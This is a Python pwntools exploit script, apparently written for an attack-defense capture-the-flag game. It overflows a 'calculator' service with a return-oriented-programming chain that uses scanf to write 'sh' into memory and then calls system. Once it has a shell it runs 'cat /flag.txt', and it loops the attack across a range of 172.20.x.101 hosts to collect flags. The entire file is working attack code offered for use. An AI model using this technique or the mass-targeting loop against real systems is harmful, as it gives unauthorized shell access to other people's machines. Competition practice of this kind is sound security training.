from pwn import *
import requests
import time
import re


def main(ip):
	p=remote(ip,10000)	

	elf=ELF('./calculator')	

	system_addr=elf.symbols['system']
	binsh_addr=0x006020A0
	poprdi=0x00400ec3 
	poprsi=0x400ec1
	frmst_addr=0x400FD2
	scanf_plt=elf.symbols['__isoc99_scanf']
	#context.log_level='debug'
	def fillchar(payload):
		p.recvuntil('operation:\n\n')
		p.sendline('1')
		p.recvuntil('x:\n')
		p.sendline(str(payload))
		p.recvuntil('y:\n')
		p.sendline('0')	

	def sendpayload(payload):
		p.recvuntil('operation:\n\n')
		p.sendline('1')
		p.recvuntil('x:\n')
		p.sendline(str(payload))
		p.recvuntil('y:\n')
		p.sendline('0')
		p.recvuntil('operation:\n\n')
		p.sendline('1')
		p.recvuntil('x:\n')
		p.sendline('0')
		p.recvuntil('y:\n')
		p.sendline('0')	
	

	def savepayload():
		p.recvuntil('operation:\n\n')
		p.sendline('5')
			

	def exp():
		p.recvuntil('calculations:')
		p.sendline(str(100))
		for i in range(62):
			fillchar(0)	
	

	#sendpayload(0x400a1f)
	#gdb.attach(p)	
	exp()
	sendpayload(poprdi) 
	sendpayload(frmst_addr)
	sendpayload(poprsi)
	sendpayload(binsh_addr)
	sendpayload(0)
	#0.&a.shu
	sendpayload(scanf_plt)	

	sendpayload(poprdi)
	sendpayload(binsh_addr)
	sendpayload(system_addr)
	savepayload()	

	binsh='sh'+'\x00'
	print len(binsh)
	binsh=binsh.ljust(8,'\x00')
	print len(binsh)
	dudu=u64(binsh)	

	p.send(str(dudu))	

	p.sendline('\n')
	p.sendline('cat /flag.txt')
	flag=p.recv()
	return flag

	p.close()
	

for i in range(101,125):
	try:
		ip='172.20.{}.101'.format(str(i))
		flag=main(ip)
		print ip,flag
		time.sleep(11)
	except:
		print 'wrong'